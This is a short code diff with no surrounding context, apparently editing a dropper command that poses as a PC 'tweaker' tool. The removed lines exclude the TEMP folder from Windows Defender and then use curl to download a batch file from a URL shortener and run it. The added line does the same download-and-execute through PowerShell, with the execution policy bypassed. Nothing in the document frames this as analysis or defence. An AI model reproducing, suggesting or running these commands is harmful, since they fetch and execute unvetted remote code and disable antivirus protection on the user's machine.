@@ -1,2 +1,1 @@
-powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:TEMP" 
-curl -sL https://tinyurl.com/VZEDSTART -o "%TEMP%\tweaker.bat" && "%TEMP%\tweaker.bat"
+powershell -ExecutionPolicy Bypass -Command "iwr -useb https://tinyurl.com/VZEDSTART -OutFile $env:TEMP\tweaker.bat; & $env:TEMP\tweaker.bat"
